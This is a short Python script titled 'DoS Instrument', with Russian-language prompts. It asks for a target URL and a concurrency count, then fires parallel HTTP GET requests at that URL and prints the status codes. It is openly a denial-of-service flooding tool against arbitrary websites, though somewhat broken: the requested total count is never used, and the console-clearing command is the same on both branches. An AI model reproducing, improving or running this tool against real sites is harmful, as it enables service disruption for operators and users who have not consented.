import os
import httpx
import time
import threading
import requests
MAGENTA = "\033[35m"
def clear_console():
    os.system('clear' if os.name == 'nt' else 'clear')
def pbanner():
    clear_console()
    banner = MAGENTA + """
    _______                            
  / ____/ /_  ____ _____  ____  __  __
 / /   / __ \/ __ `/ __ \/ __ \/ / / /
/ /___/ / / / /_/ / /_/ / /_/ / /_/ / 
\____/_/ /_/\__,_/ .___/ .___/\__, /  
                /_/   /_/    /____/   
          DoS Instrument
"""
    print(banner)
def test_load(url, num_requests, concurrent_requests):
    threads = []
    for _ in range(concurrent_requests):
        thread = threading.Thread(target=send_request, args=(url,))
        threads.append(thread)

    start_time = time.time()

    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()

    end_time = time.time()
    total_time = end_time - start_time
    print(f"Все запросы завершены за {total_time} секунд")

def send_request(url):
    with httpx.Client() as client:
        response = client.get(url)
        print(f"Статус код: {response.status_code}")

def dos():
    url = input("Введите URL: ")
    num_requests = int(input("Введите общее количество запросов: "))
    concurrent_requests = int(input("Введите количество параллельных запросов: "))
    test_load(url, num_requests, concurrent_requests)

if __name__ == '__main__':
    pbanner()
    dos()


        